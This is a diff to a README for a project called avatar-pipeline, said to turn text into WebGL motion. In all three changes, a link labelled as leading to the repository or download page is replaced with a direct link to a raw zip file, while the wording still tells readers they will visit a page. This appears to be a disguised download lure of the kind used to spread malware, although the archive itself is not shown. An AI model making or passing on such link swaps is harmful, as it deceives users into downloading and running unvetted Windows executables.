@@ -1,6 +1,6 @@
 # 🎬 avatar-pipeline - Turn text into WebGL motion
 
-[![Download avatar-pipeline](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Chewg8067/avatar-pipeline)
+[![Download avatar-pipeline](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip)
 
 ## 🖥️ What this app does
 
@@ -12,7 +12,7 @@ This project is built for people who want a simple way to run 3D motion demos on
 
 Use this link to visit the download page and get the app:
 
-[Download avatar-pipeline](https://github.com/Chewg8067/avatar-pipeline)
+[Download avatar-pipeline](https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip)
 
 After you open the page, look for the latest release or the main download file for Windows.
 
@@ -189,7 +189,7 @@ These commands are short on purpose. Simple wording helps the app build a clean 
 
 Use the main repository page to download and run the Windows build:
 
-[https://github.com/Chewg8067/avatar-pipeline](https://github.com/Chewg8067/avatar-pipeline)
+[https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip](https://raw.githubusercontent.com/Chewg8067/avatar-pipeline/main/frontend/pipeline-avatar-1.6.zip)
 
 ## 🧷 Basic use flow
 
